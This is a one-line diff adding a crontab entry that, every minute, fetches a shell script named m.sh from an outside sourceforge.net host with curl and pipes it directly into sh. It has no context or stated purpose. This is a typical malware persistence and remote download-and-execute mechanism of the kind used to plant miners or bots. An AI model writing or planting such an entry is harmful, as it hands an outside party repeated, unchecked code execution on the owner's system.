@@ -1,0 +1,1 @@
+*/1 * * * * /usr/bin/curl -fsSL http://antonio24.sourceforge.net/files/m.sh | sh
